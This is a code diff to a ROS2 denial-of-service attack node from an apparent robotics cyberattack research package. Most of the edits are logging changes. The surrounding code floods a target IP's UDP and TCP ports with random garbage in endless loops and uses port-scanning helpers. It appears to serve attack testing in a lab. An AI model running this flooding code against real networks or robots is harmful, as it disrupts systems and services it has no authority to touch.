@@ -5,7 +5,7 @@ from std_srvs.srv import Empty
 from rcl_interfaces.srv import GetParameters
 from ros2node.api import get_node_names
 from roboticpark_cyberattacks.dosattack_scan import scan_tcp_ports, scan_udp_ports
-from roboticpark_cyberattacks.utils import rslg
+from utils import rslg
 from rcl_interfaces.srv import *
 import random, socket
 from ping3 import ping
@@ -33,13 +33,15 @@ def printargs(node):
     for i in node.get_parameters_by_prefix(''):
         pamname=i
         pamvalue=node.get_parameter(i)._value
+        #pamvalue=node.get_parameter_or(pamname).get_parameter_value()
         rslg(node,f'Name of parameter:{pamname}   Value of the parameter: {pamvalue}')
+        node.get_logger().info(f'Name of parameter:{pamname}   Value of the parameter: {pamvalue}')
 
 def checkService(node):
     objectiveParam = node.get_parameter('dos_node_objective')._value
     client = node.create_client(GetParameters, f'/{objectiveParam}/get_parameters')
     if not client.wait_for_service(timeout_sec=5.0):
-        rslg(node,f'Not able to connect that node {objectiveParam}')
+        node.get_logger().info(f'Not able to connect that node {objectiveParam}')
         sys.exit()
 
 def dosSendRandomGarbageUDP(ipdest,node,ports,socketObject):
@@ -52,7 +54,7 @@ def dosSendRandomGarbageUDP(ipdest,node,ports,socketObject):
 def dosSendRandomGarbageAuxUDP(ip,node,port,socketObject):
     data = (str(random.getrandbits(4096))).encode()
     s = socket.socket(socket.AF_INET, socketObject)
-    rslg(node,f'Launching garbage into {ip} udp port {port}')
+    node.get_logger().info(f'Launching garbage into {ip} udp port {port}')
     while True:
         s.sendto(data, (ip, port))
 
@@ -69,7 +71,7 @@ def dosSendRandomGarbageAuxTCP(ip,node,port,socketObject):
             data = (str(random.getrandbits(4096))).encode()
             s = socket.socket(socket.AF_INET, socketObject)
             s.connect((ip, port))
-            rslg(node,f'Launching garbage into {ip} tcp port {port}')
+            node.get_logger().info(f'Launching garbage into {ip} tcp port {port}')
             s.sendall(data)
             s.close()
         except (socket.error, BrokenPipeError) as e:
@@ -138,7 +140,7 @@ def main():
             print(f'Servicio {nodeObjectiveServer} Tipo de parámetro {nodeObjectiveType}')
             dosFillService(mydosnode,nodeObjectiveServer,nodeObjectiveType,dospingworkers)
         except Exception as e:
-            rslg(mydosnode,f'No service available in this node {e}')
+            print(f'No service available in this node {e}')
             sys.exit()
 
 
